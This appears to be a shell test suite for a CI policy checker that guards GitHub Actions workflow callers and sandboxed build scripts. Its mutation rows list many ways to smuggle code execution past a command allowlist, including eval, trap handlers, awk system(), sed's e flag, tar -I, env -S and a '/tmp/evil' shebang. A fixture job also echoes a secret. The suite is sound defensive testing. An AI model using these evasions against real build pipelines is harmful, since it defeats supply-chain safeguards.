# The fixture is shaped like scan.yml / main-candidate-rescan.yml after the rewire: the `build` call, a scanner job (cache's, never read by the judge) and a
# `manifests` job with deliberately odd content (cache's REQ-REL-004-AC5 edits it; the judge must not read it).
cat > "$work/caller.yml" <<'EOF'
name: Proof
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  build:
    permissions:
      contents: read
      checks: read
      statuses: read
      pull-requests: read
    uses: ./.github/workflows/stage-build.yml
    with:
      mode: snapshot
  scanners:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: images
          path: /tmp/oci
  manifests:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: enumerate release manifests
        run: echo anything at all, including secrets ${{ secrets.X }}
EOF
cl() { replace "$work/caller.yml" "$work/$1.yml" "$3" "$4" && expect caught "$2" "$5" callers "$work/$1.yml"; return 0; }
# scan.yml also calls Rebuild in snapshot mode (the PR gate keeps rule 31's two-assembly check); the judge keys that on the file name
mkdir -p "$work/scanfx" "$work/rescanfx"
python3 - "$work" <<'PY'
import sys
w = sys.argv[1]
t = open(w + "/caller.yml").read()
rebuild = """  rebuild:
    needs: build
    permissions:
      contents: read
    uses: ./.github/workflows/stage-reproducibility.yml
    with:
      mode: snapshot
"""
open(w + "/scanfx/scan.yml", "w").write(t.replace("  scanners:", rebuild + "  scanners:", 1))
open(w + "/rescanfx/main-candidate-rescan.yml", "w").write(t)
PY
sc() { replace "$work/scanfx/scan.yml" "$work/scanfx/$1.yml" "$3" "$4" && cp "$work/scanfx/$1.yml" "$work/scanfx/scan.yml.$1" \
        && mkdir -p "$work/scanfx/$1" && cp "$work/scanfx/$1.yml" "$work/scanfx/$1/scan.yml" && expect caught "$2" "$5" callers \
            "$work/scanfx/$1/scan.yml";
        return 0;
        }
expect ok "AC14 fixture: build calls stage-build.yml with mode: snapshot, exactly the stage's permissions; the scanner and manifests jobs are not read" "" \
       callers "$work/caller.yml"
cl c1  "AC14 mode: release" "mode: snapshot" "mode: release" "must pass exactly with"
cl c2  "AC14 an extra input (hostile)" "      mode: snapshot" "      mode: snapshot\n      hostile: true" "must pass exactly with"
cl c3  "AC14 no input at all (the stage's default is release)" "    with:\n      mode: snapshot\n" "" "must pass exactly with"
cl c4  "AC14 secrets: inherit" "      mode: snapshot" "      mode: snapshot\n    secrets: inherit" "keys outside"
cl c5 "AC14 an if on the call" "    uses: ./.github/workflows/stage-build.yml" \
    "    if: github.event_name == 'push'\n    uses: ./.github/workflows/stage-build.yml" "keys outside"
cl c6 "AC14 the old wider grants (packages and attestations write)" "      pull-requests: read\n    uses" \
    "      pull-requests: read\n      packages: write\n      attestations: write\n    uses" \
       "exactly the permissions"
cl c7  "AC14 narrower grants than the stage requests (a startup_failure with zero jobs)" "      statuses: read\n" "" "exactly the permissions"
cl c8 "AC14 a call of the deleted stage-image.yml" "  scanners:" \
    "  assemble:\n    needs: build\n    uses: ./.github/workflows/stage-image.yml\n  scanners:" "stage-image.yml"
cl c9 "AC14 a call of stage-sign.yml (a proof workflow never signs)" "  scanners:" \
    "  sign:\n    needs: build\n    uses: ./.github/workflows/stage-sign.yml\n  scanners:" "stage-sign.yml"
cl c10 "AC14 a call of stage-promote.yml (a proof workflow never releases)" "  scanners:" \
    "  release:\n    needs: build\n    uses: ./.github/workflows/stage-promote.yml\n  scanners:" \
       "stage-promote.yml"
cl c11 "AC14 a call of stage-reproducibility.yml in a file that is not scan.yml's shape (a bare call: no mode, no needs)" "  scanners:" \
    "  rebuild:\n    needs: build\n    uses: ./.github/workflows/stage-reproducibility.yml\n  scanners:" "rebuild must pass"
cl c12 "AC14 a second call of stage-build.yml" "  scanners:" \
    "  build2:\n    uses: ./.github/workflows/stage-build.yml\n    with:\n      mode: snapshot\n  scanners:" "allowlist"
cl c13 "AC14 the workflow can be called (REQ-SCAN-015)" "  pull_request:\n" "  pull_request:\n  workflow_call:\n" "workflow_call"
# THE ALLOWLIST (step-6 round 1): any other job-level `uses` is refused whatever its form
SB="fosterstack/cache/.github/workflows"
cl a1 "AC14 allowlist: build calls stage-build.yml with an @ref" "uses: ./.github/workflows/stage-build.yml" \
    "uses: ./.github/workflows/stage-build.yml@main" "must call exactly"
cl a2  "AC14 allowlist: build calls the repository-qualified stage-build.yml" "uses: ./.github/workflows/stage-build.yml" \
       "uses: $SB/stage-build.yml@1111111111111111111111111111111111111111" "must call exactly"
cl a3  "AC14 allowlist: a second job build2 calls stage-build.yml in release mode" "  scanners:" \
       "  build2:\n    uses: ./.github/workflows/stage-build.yml\n    with:\n      mode: release\n  scanners:" "allowlist"
cl a4  "AC14 allowlist: a repository-qualified stage-build.yml under another job name" "  scanners:" \
       "  other:\n    uses: $SB/stage-build.yml@1111111111111111111111111111111111111111\n    with:\n      mode: snapshot\n  scanners:" "allowlist"
cl a5  "AC14 allowlist: a repository-qualified stage-sign.yml" "  scanners:" "  other:\n    uses: $SB/stage-sign.yml@main\n  scanners:" "allowlist"
cl a6  "AC14 allowlist: release.yml itself" "  scanners:" "  other:\n    uses: ./.github/workflows/release.yml\n  scanners:" "allowlist"
cl a7  "AC14 allowlist: stage-authorize.yml" "  scanners:" "  other:\n    uses: ./.github/workflows/stage-authorize.yml\n  scanners:" "allowlist"
cl a8  "AC14 allowlist: stage-verify.yml" "  scanners:" "  other:\n    uses: ./.github/workflows/stage-verify.yml\n  scanners:" "allowlist"
cl a9 "AC14 allowlist: stage-acceptance-predicate.yml" "  scanners:" \
    "  other:\n    uses: ./.github/workflows/stage-acceptance-predicate.yml\n  scanners:" "allowlist"
cl a10 "AC14 allowlist: stage-promote.yml with an @ref" "  scanners:" "  other:\n    uses: ./.github/workflows/stage-promote.yml@v1\n  scanners:" "allowlist"
cl a11 "AC14 allowlist: stage-reproducibility.yml under a name that is not rebuild" "  scanners:" \
       "  reproducibility:\n    uses: ./.github/workflows/stage-reproducibility.yml\n    with:\n      mode: snapshot\n  scanners:" "allowlist"
cl a12 "AC14 allowlist: a job-level uses of an action-like reference" "  scanners:" \
    "  other:\n    uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n  scanners:" "allowlist"
printf '' > "$work/empty.yml"
expect caught "AC14 an empty file is refused, not read as having no calls" "not a YAML mapping" callers "$work/empty.yml"
printf 'on:\n  pull_request:\njobs:\n  - build\n' > "$work/jobslist.yml"
expect caught "AC14 jobs as a list is refused with a clear message" "jobs must be a non-empty mapping" callers "$work/jobslist.yml"
printf 'on:\n  pull_request:\njobs:\n' > "$work/jobsnull.yml"
expect caught "AC14 an empty jobs key is refused" "jobs must be a non-empty mapping" callers "$work/jobsnull.yml"
printf 'on:\n  pull_request:\njobs:\n  build: nonsense\n' > "$work/jobscalar.yml"
expect caught "AC14 a job that is not a mapping is refused" "is not a mapping" callers "$work/jobscalar.yml"
# REQ-CHAIN-006-AC10 (PR 3): scan.yml no longer calls an acceptance stage (stage-acceptance-artifacts.yml is gone; the Linux-only archive set is checked by Check, REQ-PLAT-001-AC1)
ACC="  artifact-acceptance:\n    needs: build\n    permissions:\n      contents: read\n      packages: read\n    uses: ./.github/workflows/stage-acceptance-artifacts.yml\n    with:\n      dist-artifact: dist\n"
replace "$work/caller.yml" "$work/a13.yml" "  scanners:" "${ACC}  scanners:" \
  && expect caught "AC14 allowlist: an artifact-acceptance call of the deleted stage is refused (PR 3 removed it)" "allowlist" callers "$work/a13.yml"
mkdir -p "$work/a14"; cp "$work/a13.yml" "$work/a14/main-candidate-rescan.yml"
expect caught "AC14 allowlist: main-candidate-rescan.yml has no artifact-acceptance call" "allowlist" callers "$work/a14/main-candidate-rescan.yml"
expect ok "AC14 fixture scan.yml: build then rebuild, both in snapshot mode" "" callers "$work/scanfx/scan.yml"
expect ok "AC14 fixture main-candidate-rescan.yml: build only" "" callers "$work/rescanfx/main-candidate-rescan.yml"
cl c14 "AC14 the build call is gone" "  build:\n" "  built:\n" "build is missing"
SCAN_REBUILD="  rebuild:\n    needs: build\n    permissions:\n      contents: read\n"
SCAN_REBUILD="$SCAN_REBUILD    uses: ./.github/workflows/stage-reproducibility.yml\n    with:\n      mode: snapshot\n"
sc s1 "AC14 scan.yml without the Rebuild call (the PR gate would lose rule 31's two-assembly check)" \
      "$SCAN_REBUILD" "" "must also call Rebuild"
sc s2 "AC14 scan.yml's rebuild in release mode" "      mode: snapshot\n  scanners:" "      mode: release\n  scanners:" "rebuild must pass exactly"
sc s3 "AC14 scan.yml's rebuild with an extra input" "      mode: snapshot\n  scanners:" "      mode: snapshot\n      hostile: true\n  scanners:" \
    "rebuild must pass exactly"
sc s4 "AC14 scan.yml's rebuild that needs nothing (it could run before Build)" "  rebuild:\n    needs: build\n" "  rebuild:\n" "must need exactly build"
sc s5 "AC14 scan.yml's rebuild with contents: write" "      contents: read\n    uses: ./.github/workflows/stage-reproducibility.yml" \
      "      contents: write\n    uses: ./.github/workflows/stage-reproducibility.yml" "static ceiling"
sc s6 "AC14 scan.yml's rebuild with a packages write grant" "      contents: read\n    uses: ./.github/workflows/stage-reproducibility.yml" \
      "      contents: read\n      packages: write\n    uses: ./.github/workflows/stage-reproducibility.yml" "static ceiling"
sc s7 "AC14 scan.yml's rebuild with secrets" "      mode: snapshot\n  scanners:" "      mode: snapshot\n    secrets: inherit\n  scanners:" "keys outside"
mkdir -p "$work/rescanfx2"; cp "$work/scanfx/scan.yml" "$work/rescanfx2/main-candidate-rescan.yml"
expect caught "AC14 main-candidate-rescan.yml calls Rebuild too (it needs none)" "calls Build only" callers "$work/rescanfx2/main-candidate-rescan.yml"
# (B) the callers' grants are a STATIC CEILING: read only, whatever the stage asks for (the building jobs hold no identity token)
cl w1 "AC14 ceiling: contents: write on the build call" "      contents: read\n      checks: read" "      contents: write\n      checks: read" "static ceiling"
cl w2 "AC14 ceiling: packages: write on the build call" "      pull-requests: read\n    uses" "      pull-requests: read\n      packages: write\n    uses" \
    "static ceiling"
cl w3 "AC14 ceiling: attestations: write on the build call" "      pull-requests: read\n    uses" \
    "      pull-requests: read\n      attestations: write\n    uses" "static ceiling"
cl w6 "AC14 ceiling: id-token: write on the build call (the building jobs hold no identity token, so the caller may not grant one: owner Oct 22)" "      pull-requests: read\n    uses" \
    "      pull-requests: read\n      id-token: write\n    uses" "exactly the permissions"
sc s8 "AC14 scan.yml's rebuild with id-token: write (the building jobs hold none)" "      contents: read\n    uses: ./.github/workflows/stage-reproducibility.yml" \
      "      contents: read\n      id-token: write\n    uses: ./.github/workflows/stage-reproducibility.yml" "exactly the permissions"
cl w4 "AC14 ceiling: checks: write on the build call" "      checks: read" "      checks: write" "static ceiling"
cl w5 "AC14 ceiling: statuses: write on the build call" "      statuses: read" "      statuses: write" "static ceiling"
cl w6 "AC14 ceiling: pull-requests: write on the build call" "      pull-requests: read" "      pull-requests: write" "static ceiling"
replace "$work/caller.yml" "$work/c15.yml" "echo anything at all, including secrets" "echo changed" \
  && expect ok "AC14 an edit inside the manifests job (cache's REQ-REL-004-AC5) does not change the verdict" "" callers "$work/c15.yml"
replace "$work/caller.yml" "$work/c16.yml" "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact" \
    "    runs-on: self-hosted\n    steps:\n      - uses: actions/download-artifact" \
  && expect ok "AC14 the scanner steps are cache's: a change there does not change the verdict" "" callers "$work/c16.yml"
# ---- nosource: no step of Build or Rebuild runs source code outside melange (sandboxed-build rule 1) ----------------
# The shell closure scripts are held as exact text (line 1 included), the Python ones whole by sha256 (orchestrator ruling of Oct 30, option 1).
# Each row is one mutation of a fresh copy of the closure that the judge must refuse; the word is the message token.
python3 - "$work/ns" "$root" "$shape" <<'PY' || true      # a failed build shows as the fixture row below
import importlib.util, os, shutil, sys
dst, root, shape = sys.argv[1:4]
spec = importlib.util.spec_from_file_location("shape", shape)
S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
seen, bad = S.ns_closure(root)
assert seen and not bad, bad
for p in seen + [".github/policy/chain-scripts.json"]:
    os.makedirs(os.path.dirname(os.path.join(dst, p)), exist_ok=True)
    shutil.copy(os.path.join(root, p), os.path.join(dst, p))
# The real tree has one known finding, the admission step's `go run`; the fixture drops it so each row proves its own.
adm = dst + "/bin/build-admit.py"
lines = open(adm).read().split("\n")
hit = [n for n, l in enumerate(lines) if "[ctx.go," in l and '"verify-freeze"' in l]
assert len(hit) == 1, "the admission call moved: move this replacement with it"
lines[hit[0]] = "    rc, err = 0, b\"\""
open(adm, "w").write("\n".join(lines))
PY
# the lists of the closure files for the loops below, and a copy of the judge whose sha256 table matches this fixture (the fixture drops one line of build-admit.py)
python3 - "$root" "$shape" > "$work/ns.py.list" 2> "$work/ns.sh.list" <<'PY' || true
import importlib.util, sys
root, shape = sys.argv[1:3]
spec = importlib.util.spec_from_file_location("shape", shape)
S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
seen, bad = S.ns_closure(root)
for p in seen:
    print(p, file=(sys.stdout if p.endswith(".py") else sys.stderr))
PY
python3 - "$work/ns" "$shape" "$work/shape-fx.py" <<'PY' || true
import hashlib, re, sys
ns, shape, out = sys.argv[1:4]
s = open(shape).read()
for m in re.finditer(r'"(bin/[A-Za-z0-9_.-]+\.py)": "([0-9a-f]{64})"', s):
    path, old = m.groups()
    s = s.replace('"%s": "%s"' % (path, old), '"%s": "%s"' % (path, hashlib.sha256(open(ns + "/" + path, "rb").read()).hexdigest()))
open(out, "w").write(s)
PY
shape_real="$shape"; shape="$work/shape-fx.py"      # the fixture rows below run this judge; the real tree is judged by the real one again after them
expect ok "nosource fixture: the closure of the stage scripts is clean without the one known finding" "" \
  nosource "$work/ns"
nsfresh() { # a fresh copy; when the fixture is missing the copy is an empty tree, so each row still ends in one verdict
  rm -rf "$work/nsm"; cp -R "$work/ns" "$work/nsm" 2> /dev/null || mkdir -p "$work/nsm/bin" "$work/nsm/.github/policy"
}
nsm() { # nsm ID LABEL WORD FILE OLD NEW   (replace OLD by NEW in FILE of a fresh copy; the refusal must contain WORD)
  nsfresh
  replace "$work/ns/$4" "$work/nsm/$4" "$5" "$6" && expect caught "$2" "$3" nosource "$work/nsm"; return 0
}
nsmf() { # nsmf ID LABEL WORD NEWFILE FILE OLD NEW   (like nsm, and NEWFILE is made in the copy first)
  nsfresh; printf 'x\n' > "$work/nsm/$4"
  replace "$work/ns/$5" "$work/nsm/$5" "$6" "$7" && expect caught "$2" "$3" nosource "$work/nsm"; return 0
}
nsa() { # nsa ID LABEL WORD FILE TEXT   (add TEXT at the end of FILE; \n in TEXT is a newline)
  nsfresh; printf '\n%b\n' "$5" >> "$work/nsm/$4"
  expect caught "$1 $2" "$3" nosource "$work/nsm"
}
nsok() { # nsok ID LABEL FILE TEXT   (like nsa, and the judge must accept the copy)
  nsfresh; printf '\n%b\n' "$4" >> "$work/nsm/$3"
  expect ok "$1 $2" "" nosource "$work/nsm"
}
nsl() { # nsl ID LABEL WORD FILE OP REGEX [TEXT]   (OP after|del|sub|swap acts on the first line matching ^REGEX;
  # swap trades that line with the first line matching ^TEXT)
  nsfresh
  python3 - "$work/nsm/$4" "$5" "$6" "${7-}" <<'PY' || { bad "$1 mutation did not apply ($4 $5 $6)"; return 0; }
import re, sys
f, op, rx, text = sys.argv[1:5]
text = text.replace("\\n", "\n")
lines = open(f).read().split("\n")
i = next(n for n, l in enumerate(lines) if re.match(rx, l))
if op == "after": lines[i + 1:i + 1] = text.split("\n")
elif op == "del": del lines[i]
elif op == "sub": lines[i] = text
else:
    j = next(n for n, l in enumerate(lines) if re.match(text, l))
    lines[i], lines[j] = lines[j], lines[i]
open(f, "w").write("\n".join(lines))
PY
  expect caught "$1 $2" "$3" nosource "$work/nsm"
}
nsrow() { # nsrow ID LABEL WORD PATH   (drop the chain-scripts.json row of PATH)
  nsfresh
  python3 - "$work/nsm/.github/policy/chain-scripts.json" "$4" <<'PY' || { bad "$1 no row to drop: $4"; return 0; }
import json, sys
f, path = sys.argv[1:3]
d = json.load(open(f))
n = len(d["scripts"])
d["scripts"] = [r for r in d["scripts"] if r["path"] != path]
assert len(d["scripts"]) == n - 1, "no such row"
json.dump(d, open(f, "w"), indent=2)
PY
  expect caught "$1 $2" "$3" nosource "$work/nsm"
}
CNT="commands, the grammar has"; EXP=": expected"
# option 1: each Python closure file is held whole by sha256 (NS_PY_SHA), line 1 of each shell file is held, the stage lines run python3 -I
while read -r f; do
  nsa "H-$f" "nosource a change to $f is a finding: the file is held whole by sha256" "NS_PY_SHA" "$f" "# one more comment"
done < "$work/ns.py.list"
while read -r f; do
  nsl "L1-$f" "nosource line 1 of $f is held: a changed shebang is a finding" "shebang" "$f" sub '^#!' '#!/tmp/evil'
done < "$work/ns.sh.list"
for k in apk assemble rebuild-apk rebuild-assemble snapshot-apk snapshot-assemble snapshot-rebuild-apk snapshot-rebuild-assemble; do
  nsm "I-$k" "nosource a python3 line of bin/build-stage-$k.sh without -I is a finding" ": expected" "bin/build-stage-$k.sh" 'python3 -I bin/' 'python3 bin/'
done
py_noI=$(python3 - "$shape_real" "$root" <<'PY'
import importlib.util, re, sys
shape, root = sys.argv[1:3]
spec = importlib.util.spec_from_file_location("shape", shape)
S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
seen, bad = S.ns_closure(root)
for p in seen:
    if p.endswith(".py"):
        for n, line in enumerate(open(root + "/" + p).read().split("\n"), 1):
            if re.search(r'\["python3", ', line) and '["python3", "-I"' not in line:
                print("%s:%d" % (p, n))
PY
)
if [ -z "$py_noI" ]; then ok "nosource no closure Python file starts a python3 child without -I"
else bad "nosource a closure Python file starts a python3 child without -I: $(printf '%s' "$py_noI" | tr '\n' ' ' | cut -c1-200)"; fi
if ! grep -qE '^python3 bin/' "$root"/bin/build-stage-*.sh; then ok "nosource no stage script runs python3 without -I"
else bad "nosource a stage script still runs python3 without -I: $(grep -lE '^python3 bin/' "$root"/bin/build-stage-*.sh | head -3 | tr '\n' ' ')"; fi
if python3 - "$shape_real" "$root" <<'PY'
import importlib.util, hashlib, sys
shape, root = sys.argv[1:3]
spec = importlib.util.spec_from_file_location("shape", shape)
S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
seen, bad = S.ns_closure(root)
py = {p for p in seen if p.endswith(".py")}
assert set(S.NS_PY_SHA) == py, (sorted(set(S.NS_PY_SHA) ^ py))
for p in sorted(py):
    assert S.NS_PY_SHA[p] == hashlib.sha256(open(root + "/" + p, "rb").read()).hexdigest(), p
for p in ("bin/chain_common.py", "bin/chain_hostile.py", "bin/chain_items.py"):
    assert p in py, p      # they reach the closure only through chain-verify.py's load_sibling literals
PY
then ok "nosource NS_PY_SHA holds exactly the 15 Python closure files with their committed sha256, and chain_common, chain_hostile and chain_items are found in the closure"
else bad "nosource NS_PY_SHA does not match the Python closure files"; fi
# the round-one and rerun rows (cz, go, mk, bin1, mel1, apk1, bp1-bp24) keep their labels
nsmf cz1 "nosource a stage script runs a test-named script that is not a row" "commands, the grammar has" \
  bin/chain-test-local.py bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\npython3 bin/chain-test-local.py'
nsmf cz2 "nosource a stage script runs an extensionless bin/ file that is not a row" "commands, the grammar has" \
  bin/helper bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nbash bin/helper'
nsmf cz3 "nosource a path-qualified extensionless bin/ file that is not a row" "commands, the grammar has" \
  bin/helper bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\n./bin/helper'
nsm go1 "nosource a go build in a stage script" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n"$GO_TOOL" build ./cmd/fscache'
nsm go2 "nosource go test in a stage script" "commands, the grammar has" bin/build-stage-assemble.sh \
  'mkdir -p melange-repo' 'mkdir -p melange-repo\ngo test ./...'
nsm go3 "nosource go run through a path to the pinned toolchain (a path-qualified word is judged first)" \
  "commands, the grammar has" bin/build-stage-rebuild-apk.sh 'set -euo pipefail' \
  'set -euo pipefail\n/usr/local/bin/fscache-go/bin/go run ./tools/x'
nsm go4 "nosource go generate after a semicolon" ": expected" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'true; go generate ./...'
nsm mk1 "nosource make in a stage script" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nmake all'
nsm mk2 "nosource a compiler behind sudo" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsudo gcc -o x x.c'
nsm bin1 "nosource the produced binary run in a stage script" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\n./out/fscache.bin --version'
nsm mel1 "nosource melange started outside build-apk.sh" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nmelange build x.yaml'
nsm apk1 "nosource apko started through a path (a path-qualified word is judged first)" "commands, the grammar has" \
  bin/build-stage-assemble.sh 'mkdir -p melange-repo' 'mkdir -p melange-repo\n/usr/local/bin/apko build a b'
nsm row1 "nosource a script a stage script starts that is not a row" "is not a row of chain-scripts.json" \
  .github/policy/chain-scripts.json '"path": "bin/oci-digest.py"' '"path": "bin/oci-digest-x.py"'
nsm bp1 "nosource bash -c with a Go build inside" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nbash -c "go build ./..."'
nsm bp2 "nosource timeout in front of go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ntimeout 5 go build ./...'
nsm bp3 "nosource nice in front of go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nnice -n 5 go build ./...'
nsm bp4 "nosource xargs go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nls | xargs go build'
nsm bp5 "nosource command in front of make" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ncommand make all'
nsm bp6 "nosource time in front of go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ntime go build ./...'
nsm bp7 "nosource if go build" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nif go build ./...; then true; fi'
nsm bp8 "nosource an alias for the Go tool" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nalias g=go'
nsm bp9 "nosource python3 -c" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\npython3 -c "import os"'
nsm bp10 "nosource python3 on a file that is not a repository script" "commands, the grammar has" \
  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\npython3 /tmp/x.py'
nsm bp11 "nosource a program named by a variable" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\n"$TOOL" build ./...'
nsm bp12 "nosource go build inside a substitution inside double quotes" "commands, the grammar has" \
  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\necho "$(go build ./...)"'
nsm bp13 "nosource eval" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\neval "go build"'
nsm bp14 "nosource a compiler nobody listed" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ntsc --build'
nsm bp15 "nosource a trap handler that builds" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ntrap "go build ./..." EXIT'
nsm bp22 "nosource a script a closure script names but no runs row lists is read too" "commands, the grammar has" \
  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\nbash bin/chain-new-helper.sh'
nsm bp24 "nosource an array expansion standing for the program" "commands, the grammar has" \
  bin/build-stage-assemble.sh 'mkdir -p melange-repo' 'mkdir -p melange-repo\n"${tool[@]}" build'
nsm sh1 "nosource a substitution inside an array assignment" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nx=("$(go build ./...)")'
nsm sh2 "nosource a substitution inside a parameter expansion" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\necho ${y:-$(go build ./...)}'
nsm sh3 "nosource a substitution inside [[ ]]" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n[[ $(go build ./...) ]]'
nsm sh4 "nosource a computed command word" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n"${TOOL:-go}" build ./...'
nsm sh5 "nosource a globbed command word" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\n/usr/lo?al/bin/g? build'
nsm sh6 "nosource trap -- with a build in the handler" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\ntrap -- "go build ./..." EXIT'
nsm sh7 "nosource find -exec" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nfind . -name x -exec go build {} \;'
nsm op1 "nosource tar -I runs a program" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ntar -I x -cf a.tar b'
nsm op2 "nosource tar -I inside an option cluster" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\ntar -cIx a b'
nsm op3 "nosource sort --compress-program" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsort --compress-program=x f'
nsm op4 "nosource env -S" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nenv -S "go build" true'
nsm op5 "nosource sed -f" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsed -f x.sed f'
nsm op6 "nosource awk -f" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nawk -f x.awk f'
nsm op7 "nosource sed -nf (f inside a cluster)" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsed -nf x f'
nsm op8 "nosource sudo -u" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsudo -u root true'
nsm op9 "nosource mapfile -C" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nmapfile -C x -c 1 arr < f'
nsm op10 "nosource git -c" "commands, the grammar has" bin/build-stage-snapshot-apk.sh \
  'git tag --force v0.0.0-rc.1 HEAD' 'git tag --force v0.0.0-rc.1 HEAD\ngit -c core.pager=x log'
nsm op11 "nosource git with a subcommand that is not on the list" "commands, the grammar has" \
  bin/build-stage-snapshot-apk.sh 'git tag --force v0.0.0-rc.1 HEAD' 'git tag --force v0.0.0-rc.1 HEAD\ngit foo'
nsm sh8 "nosource awk system()" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nawk "BEGIN{system(\\"go build\\")}"'
nsm sh9 "nosource an interpreter variable with -c" "commands, the grammar has" bin/build-apk.sh 'set -euo pipefail' \
  'set -euo pipefail\n"$PY3" -c "import os"'
nsm sh10 "nosource an interpreter on a script that is not in the closure" "commands, the grammar has" \
  bin/build-stage-apk.sh 'unset GH_TOKEN' 'unset GH_TOKEN\npython3 bin/not-a-script-of-the-closure.py'
nsm sh11 "nosource a process substitution" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\ncat <(go build ./...)'
nsm sh12 "nosource sed with the e flag" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsed -n "s/x/go build/e" f'
nsm sh13 "nosource a substitution inside arithmetic" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nx=$(( $(go build ./...) ))'
nsm sv1 "nosource SUDO assigned twice" "commands, the grammar has" bin/build-apk.sh 'SUDO=/usr/bin/sudo' \
  'SUDO=/usr/bin/sudo\nSUDO=/tmp/x'
nsm sv2 "nosource GIT assigned twice on one line" ": expected" bin/build-apk.sh 'GIT=/usr/bin/git ' \
  'GIT=/usr/bin/git; GIT=/tmp/x '
nsm sv3 "nosource the sealed call array appended to" ": expected" bin/build-apk.sh 'call=("$ENVBIN" -i' \
  'call+=(x); call=("$ENVBIN" -i'
nsm sv4 "nosource melange_bin read into" ": expected" bin/build-apk.sh 'melange_bin=$MELANGE;' \
  'melange_bin=$MELANGE; read melange_bin <<< x;'
nsm sv5 "nosource MELANGE given another location" ": expected" bin/build-apk.sh 'MELANGE=/usr/local/bin/melange' \
  'MELANGE=/tmp/melange'
nsm sv6 "nosource PY3 given another location in assemble-image.sh" ": expected" bin/assemble-image.sh \
  'PY3=/usr/bin/python3' 'PY3=/tmp/python3'
nsm sd1 "nosource sed with the e command at an address" "commands, the grammar has" bin/build-stage-apk.sh \
  'unset GH_TOKEN' 'unset GH_TOKEN\nsed '\''1e go build'\'' f'
nsm sd2 "nosource sed -e with an e command" "commands, the grammar has" bin/build-stage-apk.sh 'unset GH_TOKEN' \
  'unset GH_TOKEN\nsed -n -e '\''/x/e'\'' f'
